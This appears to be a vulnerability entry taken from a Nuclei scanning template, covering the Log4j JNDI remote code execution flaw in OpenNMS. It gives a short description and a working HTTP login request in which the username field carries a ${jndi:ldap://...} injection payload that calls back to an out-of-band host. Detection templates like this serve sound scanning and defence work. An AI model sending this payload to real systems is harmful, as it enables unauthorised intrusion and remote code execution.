# Vulnerability: OpenNMS - JNDI Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`opennms-log4j-rce.yaml`)

## Description
OpenNMS JNDI is susceptible to remote code execution via Apache Log4j 2.14.1 and before. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /opennms/j_spring_security_check HTTP/1.1
Referer: {{RootURL}}/opennms/login.jsp
Content-Type: application/x-www-form-urlencoded

j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=
```

